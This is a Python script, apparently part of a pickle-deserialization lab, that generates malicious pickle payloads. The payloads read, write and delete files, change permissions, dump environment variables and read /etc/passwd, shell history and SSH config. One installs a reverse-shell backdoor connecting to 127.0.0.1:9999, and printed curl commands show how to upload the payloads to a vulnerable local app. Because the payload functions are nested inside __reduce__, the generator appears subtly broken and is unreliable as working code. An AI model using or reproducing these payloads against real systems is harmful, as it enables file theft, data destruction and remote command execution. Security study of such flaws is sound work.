#!/usr/bin/env python3
"""
File Operations Pickle Exploit
This script demonstrates how to create malicious pickle payloads that perform
file system operations when deserialized.

WARNING: For educational purposes only. Use only on systems you own.
"""

import pickle
import base64
import os
import sys
from pathlib import Path


class FileWriteExploit:
    """Creates or writes to files"""

    def __init__(self, filename, content):
        self.filename = filename
        self.content = content

    def __reduce__(self):
        def write_file(filename, content):
            with open(filename, "w") as f:
                f.write(content)
            print(f"üìù File written: {filename}")
            return f"File created: {filename}"

        return (write_file, (self.filename, self.content))


class FileReadExploit:
    """Reads and displays file contents"""

    def __init__(self, filename):
        self.filename = filename

    def __reduce__(self):
        def read_file(filename):
            try:
                with open(filename, "r") as f:
                    content = f.read()
                print(f"üìÑ Content of {filename}:")
                print("-" * 40)
                print(content)
                print("-" * 40)
                return content
            except Exception as e:
                print(f"‚ùå Error reading {filename}: {e}")
                return None

        return (read_file, (self.filename,))


class FileDeleteExploit:
    """Deletes files or directories"""

    def __init__(self, target_path):
        self.target_path = target_path

    def __reduce__(self):
        def delete_path(path):
            try:
                if os.path.isfile(path):
                    os.remove(path)
                    print(f"üóëÔ∏è  File deleted: {path}")
                elif os.path.isdir(path):
                    os.rmdir(path)
                    print(f"üóëÔ∏è  Directory deleted: {path}")
                else:
                    print(f"‚ùå Path not found: {path}")
                return f"Deleted: {path}"
            except Exception as e:
                print(f"‚ùå Error deleting {path}: {e}")
                return None

        return (delete_path, (self.target_path,))


class DirectoryListingExploit:
    """Lists directory contents"""

    def __init__(self, directory="."):
        self.directory = directory

    def __reduce__(self):
        def list_directory(directory):
            try:
                print(f"üìÇ Contents of {os.path.abspath(directory)}:")
                items = os.listdir(directory)
                for item in sorted(items):
                    item_path = os.path.join(directory, item)
                    if os.path.isdir(item_path):
                        print(f"  üìÅ {item}/")
                    else:
                        try:
                            size = os.path.getsize(item_path)
                            print(f"  üìÑ {item} ({size} bytes)")
                        except:
                            print(f"  üìÑ {item}")
                return items
            except Exception as e:
                print(f"‚ùå Error listing directory {directory}: {e}")
                return None

        return (list_directory, (self.directory,))


class FilePermissionExploit:
    """Changes file permissions"""

    def __init__(self, filename, permissions):
        self.filename = filename
        self.permissions = permissions

    def __reduce__(self):
        def change_permissions(filename, perms):
            try:
                os.chmod(filename, perms)
                print(f"üîí Changed permissions of {filename} to {oct(perms)}")
                return f"Permissions changed: {filename}"
            except Exception as e:
                print(f"‚ùå Error changing permissions: {e}")
                return None

        return (change_permissions, (self.filename, self.permissions))


class EnvironmentExploit:
    """Reads environment variables and system info"""

    def __reduce__(self):
        def dump_environment():
            print("üåç ENVIRONMENT VARIABLES:")
            print("=" * 50)

            # Show interesting environment variables
            interesting_vars = [
                "USER",
                "HOME",
                "PATH",
                "SHELL",
                "TERM",
                "SSH_CLIENT",
                "SSH_CONNECTION",
                "PWD",
                "LANG",
                "LC_ALL",
            ]

            for var in interesting_vars:
                value = os.environ.get(var, "Not set")
                print(f"{var}: {value}")

            print(f"\nüìä Total environment variables: {len(os.environ)}")

            # Show current working directory
            print(f"\nüìÇ Current working directory: {os.getcwd()}")

            # Show process ID
            print(f"üÜî Process ID: {os.getpid()}")

            return dict(os.environ)

        return (dump_environment, ())


class ConfigFileExploit:
    """Attempts to read common configuration files"""

    def __reduce__(self):
        def read_config_files():
            config_files = [
                "/etc/passwd",
                "/etc/hosts",
                "/etc/hostname",
                os.path.expanduser("~/.bashrc"),
                os.path.expanduser("~/.bash_history"),
                os.path.expanduser("~/.ssh/config"),
                "/proc/version",
                "/proc/cpuinfo",
            ]

            print("üîç ATTEMPTING TO READ CONFIGURATION FILES:")
            print("=" * 55)

            results = {}

            for config_file in config_files:
                try:
                    if os.path.exists(config_file) and os.path.isfile(config_file):
                        with open(config_file, "r") as f:
                            content = f.read(1000)  # Limit to first 1000 chars
                        print(f"\nüìÑ {config_file}:")
                        print("-" * 30)
                        print(content)
                        if len(content) == 1000:
                            print("[... truncated ...]")
                        results[config_file] = content
                    else:
                        print(f"‚ùå {config_file}: Not found or not accessible")
                except Exception as e:
                    print(f"‚ùå {config_file}: Error - {e}")

            return results

        return (read_config_files, ())


def create_malicious_script_payload():
    """Create a payload that writes a malicious script"""
    script_content = """#!/bin/bash
# Malicious script created by pickle exploit
echo "This script was created by a pickle exploit"
echo "Current user: $(whoami)"
echo "Current directory: $(pwd)"
echo "System info: $(uname -a)"
"""
    return pickle.dumps(FileWriteExploit("/tmp/malicious_script.sh", script_content))


def create_data_exfiltration_payload():
    """Create a payload that attempts to exfiltrate sensitive data"""
    exploit = ConfigFileExploit()
    return pickle.dumps(exploit)


def create_backdoor_payload():
    """Create a payload that installs a simple backdoor"""
    backdoor_content = '''#!/usr/bin/env python3
import socket
import subprocess
import threading
import time

def backdoor():
    """Simple backdoor function"""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect(('127.0.0.1', 9999))
            
            while True:
                command = s.recv(1024).decode()
                if command.lower() == 'exit':
                    break
                
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    s.send(output)
                except Exception as e:
                    s.send(f"Error: {str(e)}\\n".encode())
            
            s.close()
        except:
            pass
        
        time.sleep(60)  # Wait 60 seconds before retry

if __name__ == "__main__":
    backdoor()
'''
    return pickle.dumps(FileWriteExploit("/tmp/backdoor.py", backdoor_content))


def demonstrate_file_operations():
    """Demonstrate various file operation attacks"""

    print("üìÅ FILE OPERATIONS PICKLE EXPLOITS")
    print("=" * 50)
    print("‚ö†Ô∏è  WARNING: Educational purposes only!")
    print("   Use only on systems you own or have permission to test.")
    print("=" * 50)

    # Create output directory
    output_dir = (
        Path("../payloads") if Path("../payloads").exists() else Path("payloads")
    )
    output_dir.mkdir(exist_ok=True)

    # Define exploits
    exploits = [
        (
            "File Write",
            pickle.dumps(
                FileWriteExploit(
                    "/tmp/exploit_test.txt",
                    "This file was created by a pickle exploit!\nTimestamp: "
                    + str(__import__("time").time()),
                )
            ),
        ),
        ("File Read", pickle.dumps(FileReadExploit("/etc/hostname"))),
        ("Directory Listing", pickle.dumps(DirectoryListingExploit("/tmp"))),
        ("Environment Dump", pickle.dumps(EnvironmentExploit())),
        ("Config Files", create_data_exfiltration_payload()),
        ("Malicious Script", create_malicious_script_payload()),
        ("Backdoor Install", create_backdoor_payload()),
        ("Current Dir List", pickle.dumps(DirectoryListingExploit("."))),
        (
            "Home Dir List",
            pickle.dumps(DirectoryListingExploit(os.path.expanduser("~"))),
        ),
    ]

    print("\nüì¶ GENERATING FILE OPERATION PAYLOADS:")
    print("-" * 45)

    for name, payload in exploits:
        print(f"\nüéØ {name}")

        # Save binary payload
        filename = output_dir / f"file_{name.lower().replace(' ', '_')}.pkl"
        with open(filename, "wb") as f:
            f.write(payload)
        print(f"üíæ Binary payload: {filename}")

        # Save base64 payload
        b64_payload = base64.b64encode(payload).decode("utf-8")
        b64_filename = output_dir / f"file_{name.lower().replace(' ', '_')}_base64.txt"
        with open(b64_filename, "w") as f:
            f.write(b64_payload)
        print(f"üìÑ Base64 payload: {b64_filename}")
        print(f"üìè Size: {len(payload)} bytes")
        print(f"üîç Preview: {b64_payload[:60]}...")

    print(f"\n‚úÖ All file operation payloads saved to '{output_dir}'")

    print("\nüß™ TESTING EXAMPLES:")
    print("1. Start vulnerable app: python vulnerable_app.py")
    print("2. Test file read:")
    print(
        "   curl -X POST -F 'pickle_file=@payloads/file_file_read.pkl' http://127.0.0.1:5000/process_pickle"
    )
    print("3. Test directory listing:")
    print(
        "   curl -X POST -F 'pickle_file=@payloads/file_directory_listing.pkl' http://127.0.0.1:5000/process_pickle"
    )

    print("\nüîç WHAT TO LOOK FOR:")
    print("- New files created in /tmp/")
    print("- Sensitive data displayed in application output")
    print("- Directory contents revealed")
    print("- Environment variables exposed")
    print("- Configuration files accessed")


def create_custom_file_payload(operation, target, content=None):
    """Create a custom file operation payload"""

    if operation == "read":
        exploit = FileReadExploit(target)
    elif operation == "write":
        if not content:
            content = f"Created by pickle exploit at {__import__('time').ctime()}"
        exploit = FileWriteExploit(target, content)
    elif operation == "list":
        exploit = DirectoryListingExploit(target)
    elif operation == "delete":
        exploit = FileDeleteExploit(target)
    else:
        print(f"‚ùå Unknown operation: {operation}")
        return None

    payload = pickle.dumps(exploit)
    b64_payload = base64.b64encode(payload).decode("utf-8")

    print(f"üéØ Created {operation} payload for: {target}")
    print(f"üì¶ Binary size: {len(payload)} bytes")
    print(f"üìÑ Base64 payload:")
    print(b64_payload)

    return payload


def main():
    """Main function"""
    if len(sys.argv) > 1:
        if sys.argv[1] == "--help":
            print("File Operations Pickle Exploit Generator")
            print("\nUsage:")
            print(
                "  python file_operations.py                           # Generate all payloads"
            )
            print("  python file_operations.py read <file>               # Read file")
            print("  python file_operations.py write <file> [content]    # Write file")
            print(
                "  python file_operations.py list <directory>          # List directory"
            )
            print("  python file_operations.py delete <file>             # Delete file")
            print("\nExamples:")
            print("  python file_operations.py read /etc/passwd")
            print("  python file_operations.py write /tmp/test.txt 'Hello World'")
            print("  python file_operations.py list /home")
            print("  python file_operations.py delete /tmp/unwanted.txt")
        elif len(sys.argv) >= 3:
            operation = sys.argv[1]
            target = sys.argv[2]
            content = sys.argv[3] if len(sys.argv) > 3 else None
            create_custom_file_payload(operation, target, content)
        else:
            print("‚ùå Invalid arguments. Use --help for usage information.")
    else:
        demonstrate_file_operations()


if __name__ == "__main__":
    main()
